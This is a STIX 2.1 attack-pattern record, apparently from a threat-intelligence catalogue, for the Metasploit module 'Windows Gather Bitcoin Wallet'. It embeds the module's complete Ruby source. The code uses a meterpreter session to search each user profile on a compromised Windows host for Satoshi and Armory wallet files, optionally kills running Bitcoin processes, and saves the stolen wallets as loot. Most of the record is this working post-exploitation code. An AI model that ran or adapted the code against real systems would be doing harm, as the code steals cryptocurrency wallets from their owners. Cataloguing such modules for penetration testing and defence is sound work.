{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--888bc9d7-5d03-4f57-bd06-6ab7bd761b64",
    "created": "2024-08-14T16:33:05.055991Z",
    "modified": "2024-08-14T16:33:05.055995Z",
    "name": "Windows Gather Bitcoin Wallet",
    "description": " This module downloads any Bitcoin wallet files from the target system. It currently supports both the classic Satoshi wallet and the more recent Armory wallets. Note that Satoshi wallets tend to be unencrypted by default, while Armory wallets tend to be encrypted by default.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/bitcoin_jacker.rb",
            "external_id": "bitcoin_jacker.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Auxiliary::Report\n  include Msf::Post::Windows::UserProfiles\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Bitcoin Wallet',\n        'Description' => %q{\n          This module downloads any Bitcoin wallet files from the target\n          system. It currently supports both the classic Satoshi wallet and the\n          more recent Armory wallets. Note that Satoshi wallets tend to be\n          unencrypted by default, while Armory wallets tend to be encrypted by default.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'illwill <illwill[at]illmob.org>', # Original implementation\n          'todb' # Added Armory support\n        ],\n        'Platform' => [ 'win' ], # TODO: Several more platforms host Bitcoin wallets...\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_process_get_processes\n              stdapi_sys_process_kill\n            ]\n          }\n        }\n      )\n    )\n\n    register_options([\n      OptBool.new('KILL_PROCESSES', [false, 'Kill associated Bitcoin processes before jacking.', false]),\n    ])\n  end\n\n  def run\n    print_status('Checking all user profiles for Bitcoin wallets...')\n    found_wallets = false\n    grab_user_profiles.each do |user|\n      next unless user['AppData']\n\n      bitcoin_wallet_path = user['AppData'] + '\\\\Bitcoin\\\\wallet.dat'\n      next unless file?(bitcoin_wallet_path)\n\n      found_wallets = true\n      jack_wallet(bitcoin_wallet_path)\n      armory_wallet_path = user['AppData'] + '\\\\Armory'\n      session.fs.dir.foreach(armory_wallet_path) do |fname|\n        next unless fname =~ /\\.wallet/\n\n        found_wallets = true\n        armory_wallet_fullpath = armory_wallet_path + \"\\\\#{fname}\"\n        jack_wallet(armory_wallet_fullpath)\n      end\n    end\n    unless found_wallets\n      print_warning 'No wallets found, nothing to do.'\n    end\n  end\n\n  def jack_wallet(wallet_path)\n    data = ''\n    wallet_type = case wallet_path\n                  when /\\.wallet$/\n                    :armory\n                  when /wallet\\.dat$/\n                    :satoshi\n                  else\n                    :unknown\n                  end\n\n    if wallet_type == :unknown\n      print_error \"Unknown wallet type: #{wallet_path}, nothing to do.\"\n      return\n    end\n\n    print_status(\"#{wallet_type.to_s.capitalize} Wallet found at #{wallet_path}\")\n    print_status(\"Jackin' wallet...\")\n\n    kill_bitcoin_processes if datastore['KILL_PROCESSES']\n\n    begin\n      data = read_file(wallet_path) || ''\n    rescue ::Exception => e\n      print_error(\"Failed to download #{wallet_path}: #{e.class} #{e}\")\n      return\n    end\n\n    if data.empty?\n      print_error('No data found, nothing to save.')\n    else\n      loot_result = store_loot(\n        \"bitcoin.wallet.#{wallet_type}\",\n        'application/octet-stream',\n        session,\n        data,\n        wallet_path,\n        \"Bitcoin Wallet (#{wallet_type.to_s.capitalize})\"\n      )\n      print_status(\"Wallet jacked: #{loot_result}\")\n    end\n  end\n\n  def kill_bitcoin_processes\n    client.sys.process.get_processes.each do |process|\n      pname = process['name'].downcase\n      next unless pname == 'bitcoin.exe' || pname == 'bitcoind.exe' || pname == 'armoryqt.exe'\n\n      print_status(\"#{process['name']} Process Found...\")\n      print_status(\"Killing Process ID #{process['pid']}...\")\n      session.sys.process.kill(process['pid'])\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ], # TODO: Several more platforms host Bitcoin wallets..."
    ]
}